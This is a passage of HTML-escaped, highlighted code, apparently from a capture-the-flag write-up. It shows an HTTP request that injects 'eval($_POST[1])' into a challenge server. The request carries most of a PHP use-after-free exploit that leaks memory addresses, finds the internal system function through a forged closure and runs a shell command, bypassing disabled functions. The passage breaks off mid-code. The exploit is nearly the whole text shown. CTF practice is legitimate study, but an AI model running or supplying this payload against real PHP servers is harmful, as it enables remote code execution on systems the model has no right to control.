class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/?exp=eval($_POST[1]);&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;b21e5822-28d4-4637-a2cd-770de49a5462.node4.buuoj.cn:81&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;gzip, deflate&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;multipart/form-data; boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;6917&lt;br&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;------WebKitFormBoundaryj28zfvoWVxnHdp29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;Content-Disposition: form-data; name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;pwn(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;uname -a&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;pwn&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    define(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;LOGGING&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    define(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;CHUNK_DATA_SIZE&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    define(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;CHUNK_SIZE&amp;#x27;&lt;/span&gt;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt; : CHUNK_DATA_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    define(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;FILTER_SIZE&amp;#x27;&lt;/span&gt;, ZEND_DEBUG_BUILD ? &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    define(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;STRING_SIZE&amp;#x27;&lt;/span&gt;, CHUNK_DATA_SIZE - &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    define(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;CMD&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$groom&lt;/span&gt;[] = Pwn::alloc(STRING_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    stream_filter_register(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pwn_filter&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Pwn&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$fd&lt;/span&gt; = fopen(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php://memory&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    stream_filter_append(&lt;span class=&#34;hljs-variable&#34;&gt;$fd&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pwn_filter&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    fputs(&lt;span class=&#34;hljs-variable&#34;&gt;$fd&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;x&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Helper&lt;/span&gt; &lt;/span&gt;&amp;#123; &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt;; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Pwn&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;php_user_filter&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$abc_addr&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$helper&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$helper_addr&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$helper_off&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$uafp&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$hfp&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$in&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$out&lt;/span&gt;, &amp;amp;&lt;span class=&#34;hljs-variable&#34;&gt;$consumed&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$closing&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$closing&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        stream_bucket_make_writeable(&lt;span class=&#34;hljs-variable&#34;&gt;$in&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filtername = Pwn::alloc(STRING_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        fclose(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;go();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; PSFS_PASS_ON;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;go&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc = &amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filtername;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;make_uaf_obj();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Helper;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper-&amp;gt;b = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_addr = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;str2ptr(CHUNK_SIZE * &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;) - CHUNK_SIZE * &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;helper @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc_addr = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_addr - CHUNK_SIZE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;abc @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_addr - &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc_addr - &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$helper_handlers&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;str2ptr(CHUNK_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;helper handlers @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$helper_handlers&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;prepare_leaker();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$binary_leak&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$helper_handlers&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;binary leak @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$binary_leak&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;prepare_cleanup(&lt;span class=&#34;hljs-variable&#34;&gt;$binary_leak&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$closure_addr&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;str2ptr(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off + &lt;span class=&#34;hljs-number&#34;&gt;0x38&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;real closure @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$closure_addr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$closure_ce&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$closure_addr&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;closure class_entry @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$closure_ce&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$basic_funcs&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;get_basic_funcs(&lt;span class=&#34;hljs-variable&#34;&gt;$closure_ce&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;basic_functions @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$basic_funcs&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$zif_system&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;get_system(&lt;span class=&#34;hljs-variable&#34;&gt;$basic_funcs&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;zif_system @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$zif_system&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_off&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off + CHUNK_SIZE * &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x138&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; += &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_off&lt;/span&gt; + &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$closure_addr&lt;/span&gt; + &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_off&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x38&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$handler_offset&lt;/span&gt; = PHP_MAJOR_VERSION === &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; ? &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0x68&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_off&lt;/span&gt; + &lt;span class=&#34;hljs-variable&#34;&gt;$handler_offset&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$zif_system&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_addr&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_addr + &lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_off&lt;/span&gt; - &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off + &lt;span class=&#34;hljs-number&#34;&gt;0x38&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_addr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fake closure @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$fake_closure_addr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;cleanup();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        (&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper-&amp;gt;b)(CMD);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;make_uaf_obj&lt;/span&gt;(&lt;span 